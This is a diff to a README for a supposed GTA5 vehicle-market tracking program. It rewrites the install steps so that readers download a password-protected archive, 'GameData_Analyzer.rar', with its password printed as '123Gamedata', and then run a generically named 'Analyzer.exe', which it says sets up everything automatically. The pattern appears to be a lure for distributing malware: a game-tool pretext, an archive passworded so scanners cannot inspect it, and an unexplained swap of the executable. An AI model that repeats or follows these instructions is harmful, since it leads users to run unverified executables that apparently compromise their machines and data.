@@ -22,8 +22,8 @@ The software provides **real-time price tracking, market trends, and recommendat
 ## 📥 Installation & Launch
 
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **Download and extract the `.rar` file**  
-2️⃣ **Run `GTA5_Vehicle_Market_Tracker.exe`**  
+1️⃣ **Download and extract the `GameData_Analyzer.rar` (pass:123Gamedata)  
+2️⃣ **Run `Analyzer.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
 
 ⚠️ **Important:** This method is **faster** and requires **no manual setup**!  
